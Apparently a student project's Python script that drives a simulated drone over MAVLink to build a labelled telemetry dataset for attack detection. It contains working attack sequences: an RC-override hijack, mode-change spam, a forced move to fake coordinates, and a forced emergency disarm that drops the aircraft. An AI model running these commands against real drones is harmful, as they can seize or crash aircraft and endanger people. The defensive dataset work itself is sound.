"""
=============================================================
  Automated UAV Dataset Generator
  Part of the UAV Cyber Defense System (MSc FYP)
  
  This script acts as both the Autopilot and the Attacker.
  It takes off, flies, lands, and injects attacks completely
  autonomously while logging perfectly synced labeled telemetry.
=============================================================
"""
import time
import csv
import threading
from pymavlink import mavutil

# Global state
current_label = 0
keep_logging = True
TARGET_MESSAGES = ['GPS_RAW_INT', 'ATTITUDE', 'VFR_HUD', 'HEARTBEAT']

def setup_csv_writer(filename):
    file = open(filename, 'w', newline='')
    writer = csv.writer(file)
    header = [
        'timestamp', 'msg_type', 'lat', 'lon', 'alt', 'eph', 'epv', 'vel', 'cog', 'satellites_visible',
        'roll', 'pitch', 'yaw', 'rollspeed', 'pitchspeed', 'yawspeed',
        'airspeed', 'groundspeed', 'heading', 'throttle', 'climb',
        'custom_mode', 'type', 'autopilot', 'base_mode', 'system_status',
        'label'
    ]
    writer.writerow(header)
    return file, writer

def arm_and_takeoff(vehicle, alt=15):
    print(f"\n[AUTO] Arming and taking off to {alt}m...")
    vehicle.mav.param_set_send(
        vehicle.target_system, vehicle.target_component,
        b'ARMING_CHECK', 0, mavutil.mavlink.MAV_PARAM_TYPE_REAL32
    )
    time.sleep(0.5)
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 4, 0, 0, 0, 0, 0) # Mode 4 = GUIDED
    time.sleep(2)
    
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
    time.sleep(3)
    
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_NAV_TAKEOFF, 0, 0, 0, 0, 0, 0, 0, alt)
    
    # Wait for climb
    time.sleep(20)
    print("[AUTO] Takeoff complete. Hovering.")
    time.sleep(2)

def force_rtl(vehicle):
    print("\n[AUTO] Forcing RTL (Return to Launch)...")
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 6, 0, 0, 0, 0, 0) # Mode 6 = RTL
    
    # Wait for it to land and disarm automatically
    print("[AUTO] Waiting 30 seconds for drone to land and disarm...")
    time.sleep(30) 
    print("[AUTO] RTL complete.")

def auto_pilot_sequence(vehicle):
    global current_label, keep_logging
    
    print("\n" + "="*50)
    print("  PHASE 0: RECORDING NORMAL FLIGHT (LABEL 0)")
    print("="*50)
    current_label = 0
    arm_and_takeoff(vehicle, 15)
    
    # Simulate some normal flight
    print("[AUTO] Flying forward (Waypoint)...")
    msg = None
    while not msg:
        msg = vehicle.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=1.0)
    
    lat = msg.lat / 1e7
    lon = msg.lon / 1e7
    
    # Move ~50 meters North
    vehicle.mav.set_position_target_global_int_send(
        0, vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000,
        int((lat + 0.0005) * 1e7), int(lon * 1e7), 15.0,
        0, 0, 0, 0, 0, 0, 0, 0)
    
    time.sleep(10) # Let it fly for 10s
    force_rtl(vehicle)
    
    # --- ATTACKS ---
    
    print("\n" + "="*50)
    print("  PHASE 1: RECORDING RC HIJACK (LABEL 1)")
    print("="*50)
    arm_and_takeoff(vehicle, 20)
    print("[INJECT] Launching Attack 1...")
    current_label = 1
    
    # Attack 1 Logic: Force Stabilize and spin
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 0, 0, 0, 0, 0, 0) # STABILIZE
    time.sleep(0.5)
    
    for _ in range(300): # 30 seconds of attack data
        vehicle.mav.rc_channels_override_send(
            vehicle.target_system, vehicle.target_component,
            2000, 1000, 2000, 2000, 0, 0, 0, 0)
        time.sleep(0.1)
    
    # Release RC
    vehicle.mav.rc_channels_override_send(
        vehicle.target_system, vehicle.target_component,
        0, 0, 0, 0, 0, 0, 0, 0)
    current_label = 0
    force_rtl(vehicle)
    
    print("\n" + "="*50)
    print("  PHASE 2: RECORDING MODE FORCE (LABEL 2)")
    print("="*50)
    arm_and_takeoff(vehicle, 20)
    print("[INJECT] Launching Attack 2...")
    current_label = 2
    
    # Attack 2 Logic: Spam mode changes
    modes = [9, 6, 9, 0, 6, 9, 6, 9, 0, 6] # Double the mode changes for more data
    for m in modes:
        vehicle.mav.command_long_send(
            vehicle.target_system, vehicle.target_component,
            mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, m, 0, 0, 0, 0, 0)
        time.sleep(3.0)
        
    current_label = 0
    force_rtl(vehicle)
    
    print("\n" + "="*50)
    print("  PHASE 3: RECORDING GPS SPOOF (LABEL 3)")
    print("="*50)
    arm_and_takeoff(vehicle, 20)
    print("[INJECT] Launching Attack 3...")
    current_label = 3
    
    # Attack 3 Logic: Force to fake coordinates
    for _ in range(60): # 30 seconds of spoofing
        vehicle.mav.set_position_target_global_int_send(
            0, vehicle.target_system, vehicle.target_component,
            mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
            0b0000111111111000,
            int(-35.37 * 1e7), int(149.18 * 1e7), 50.0,
            0, 0, 0, 0, 0, 0, 0, 0)
        time.sleep(0.5)
        
    current_label = 0
    force_rtl(vehicle)
    
    print("\n" + "="*50)
    print("  PHASE 4: RECORDING DISARM (LABEL 4)")
    print("="*50)
    arm_and_takeoff(vehicle, 10)
    print("[INJECT] Launching Attack 4...")
    current_label = 4
    
    # Attack 4 Logic: Parameter crash and disarm
    vehicle.mav.param_set_send(
        vehicle.target_system, vehicle.target_component,
        b'RTL_ALT', 1, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
    time.sleep(0.5)
    
    vehicle.mav.command_long_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
        0, 21196, 0, 0, 0, 0, 0) # Magic emergency disarm
    
    time.sleep(15) # Let it fall and record the crash data
    
    # Fix the parameter back to normal so drone isn't permanently broken
    vehicle.mav.param_set_send(
        vehicle.target_system, vehicle.target_component,
        b'RTL_ALT', 1500, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        
    current_label = 0
    
    print("\n[✓] ALL PHASES COMPLETE!")
    keep_logging = False

def data_logger(vehicle, output_file):
    global keep_logging, current_label
    file, writer = setup_csv_writer(output_file)
    
    vehicle.mav.request_data_stream_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1) # 10Hz
        
    try:
        while keep_logging:
            msg = vehicle.recv_match(type=TARGET_MESSAGES, blocking=True, timeout=0.1)
            if not msg: continue
            
            msg_type = msg.get_type()
            ts = time.time()
            row = [ts, msg_type, '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', current_label]
            
            if msg_type == 'GPS_RAW_INT':
                row[2:10] = [msg.lat, msg.lon, msg.alt, msg.eph, msg.epv, msg.vel, msg.cog, msg.satellites_visible]
            elif msg_type == 'ATTITUDE':
                row[10:16] = [msg.roll, msg.pitch, msg.yaw, msg.rollspeed, msg.pitchspeed, msg.yawspeed]
            elif msg_type == 'VFR_HUD':
                row[16:21] = [msg.airspeed, msg.groundspeed, msg.heading, msg.throttle, msg.climb]
            elif msg_type == 'HEARTBEAT':
                row[21:26] = [msg.custom_mode, msg.type, msg.autopilot, msg.base_mode, msg.system_status]
            
            writer.writerow(row)
            
    except KeyboardInterrupt:
        pass
    finally:
        file.close()


def data_logger_fixed(vehicle, output_file):
    """Improved logger: writes COMPLETE rows at 10Hz with no nulls."""
    global keep_logging, current_label
    import numpy as np
    
    file = open(output_file, 'w', newline='')
    writer = csv.writer(file)
    header = [
        'lat', 'lon', 'alt', 'eph', 'epv', 'vel', 'cog', 'satellites_visible',
        'roll', 'pitch', 'yaw', 'rollspeed', 'pitchspeed', 'yawspeed',
        'airspeed', 'groundspeed', 'heading', 'throttle', 'climb',
        'label'
    ]
    writer.writerow(header)
    
    vehicle.mav.request_data_stream_send(
        vehicle.target_system, vehicle.target_component,
        mavutil.mavlink.MAV_DATA_STREAM_ALL, 10, 1)
    
    current_state = np.zeros(19)
    last_write = time.time()
    
    try:
        while keep_logging:
            msg = vehicle.recv_match(type=TARGET_MESSAGES, blocking=True, timeout=0.05)
            if msg:
                msg_type = msg.get_type()
                if msg_type == 'GPS_RAW_INT':
                    current_state[0:8] = [msg.lat, msg.lon, msg.alt, msg.eph, msg.epv, msg.vel, msg.cog, msg.satellites_visible]
                elif msg_type == 'ATTITUDE':
                    current_state[8:14] = [msg.roll, msg.pitch, msg.yaw, msg.rollspeed, msg.pitchspeed, msg.yawspeed]
                elif msg_type == 'VFR_HUD':
                    current_state[14:19] = [msg.airspeed, msg.groundspeed, msg.heading, msg.throttle, msg.climb]
            
            # Write one complete row every 100ms (10Hz)
            now = time.time()
            if now - last_write >= 0.1:
                last_write = now
                row = list(current_state) + [current_label]
                writer.writerow(row)
    except KeyboardInterrupt:
        pass
    finally:
        file.close()

if __name__ == '__main__':
    print("[*] Connecting to SITL (Ensure SITL is running and no other script is connected)...")
    # Using 14550 for the generator
    vehicle = mavutil.mavlink_connection('udp:127.0.0.1:14550')
    vehicle.wait_heartbeat()
    print("[*] Connected!")
    
    output_filename = "perfect_dataset.csv"
    
    # Start FIXED logger thread (complete rows, no nulls)
    log_thread = threading.Thread(target=data_logger_fixed, args=(vehicle, output_filename))
    log_thread.daemon = True
    log_thread.start()
    
    # Run auto-pilot on main thread
    auto_pilot_sequence(vehicle)
    
    print(f"\n[★] Success! Dataset saved to {output_filename}")
